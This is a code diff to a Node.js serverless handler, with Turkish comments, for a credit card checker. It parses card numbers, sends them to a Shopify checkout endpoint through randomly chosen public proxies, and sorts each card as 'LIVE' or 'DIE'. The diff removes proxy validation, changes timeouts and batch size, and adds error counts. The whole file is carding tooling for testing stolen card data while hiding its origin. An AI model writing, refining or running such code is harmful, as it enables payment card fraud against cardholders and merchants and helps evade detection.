@@ -3,6 +3,7 @@ const { formidable } = require('formidable');
 const fs = require('fs');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
+// --- SINIRSIZ PROXY ÇEKME (Test etmeden direkt kullanır) ---
 async function getProxies() {
     try {
         const urls = [
@@ -12,7 +13,7 @@ async function getProxies() {
         let allProxies = [];
         for (const url of urls) {
             try {
-                const res = await axios.get(url, { timeout: 3000 });
+                const res = await axios.get(url, { timeout: 4000 });
                 allProxies = allProxies.concat(res.data.split('\n').filter(p => p.trim() !== ''));
             } catch (e) {}
         }
@@ -20,17 +21,7 @@ async function getProxies() {
     } catch (e) { return []; }
 }
 
-async function checkProxy(proxy) {
-    try {
-        await axios.get('http://httpbin.org/ip', {
-            proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) },
-            timeout: 2500
-        });
-        return proxy;
-    } catch (e) { return null; }
-}
-
-// SHOPIFY AUTH FREE MOTORU (En hızlısı)
+// --- KART KONTROL (Shopify Auth Free) ---
 async function checkCard(card, proxy) {
     try {
         const parts = card.trim().split('|');
@@ -39,10 +30,10 @@ async function checkCard(card, proxy) {
 
         if (yy.length === 4) yy = yy.substring(2); // 2028 -> 28
 
+        // Proxy varsa kullan, yoksa direkt bağlan
         const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;
 
-        // Rastgele bir Shopify mağazasının ödeme sayfası (Auth Free)
-        // Bu mağazalar sadece kartı test eder, para çekmez.
+        // Shopify test ödeme sayfası
         const shopifyUrl = 'https://checkout.shopify.com/store/checkout';
         
         const payload = new URLSearchParams({
@@ -68,22 +59,23 @@ async function checkCard(card, proxy) {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             },
             httpsAgent: agent,
-            timeout: 8000,
+            timeout: 10000,
             validateStatus: () => true
         });
 
         const text = response.data.toLowerCase();
 
         if (text.includes('card was declined') || text.includes('invalid') || text.includes('not processed') || text.includes('failed')) {
-            return { card, status: 'DIE', msg: 'Declined', proxy };
+            return { card, status: 'DIE', msg: 'Declined' };
         } else if (text.includes('approved') || text.includes('success') || response.status === 302 || response.status === 200) {
-            return { card, status: 'LIVE', msg: 'Approved', proxy };
+            return { card, status: 'LIVE', msg: 'Approved' };
         }
         
-        return { card, status: 'DIE', msg: 'Unknown', proxy };
+        return { card, status: 'DIE', msg: 'Unknown' };
 
     } catch (e) {
-        return { card, status: 'ERROR', msg: 'Proxy/Connection', proxy };
+        // Hata alırsa ERROR dön
+        return { card, status: 'ERROR', msg: 'Proxy Hatasi' };
     }
 }
 
@@ -109,23 +101,16 @@ module.exports = async (req, res) => {
 
     if (cardsToCheck.length === 0) return res.status(400).json({ hata: "Kart bulunamadi." });
 
+    // Proxy havuzunu al (test etmiyoruz, direkt kullanıyoruz)
     const proxies = await getProxies();
-    let liveProxies = [];
-    for (const p of proxies) {
-        if (liveProxies.length >= 3) break;
-        const check = await checkProxy(p);
-        if (check) liveProxies.push(p);
-    }
-
-    if (liveProxies.length === 0) return res.status(500).json({ hata: "Proxy yok." });
-
+    
     let results = [];
-    let proxyIndex = 0;
-
-    for (let i = 0; i < Math.min(cardsToCheck.length, 20); i++) {
+    // Kartları işle (Maksimum 10 kart)
+    for (let i = 0; i < Math.min(cardsToCheck.length, 10); i++) {
         const card = cardsToCheck[i];
-        const currentProxy = liveProxies[proxyIndex % liveProxies.length];
-        proxyIndex++;
+        // Rastgele bir proxy seç
+        const currentProxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
+        
         const result = await checkCard(card, currentProxy);
         results.push(result);
     }
@@ -134,6 +119,7 @@ module.exports = async (req, res) => {
         success: true,
         live: results.filter(r => r.status === 'LIVE').length,
         die: results.filter(r => r.status === 'DIE').length,
+        error: results.filter(r => r.status === 'ERROR').length,
         results: results
     });
 };
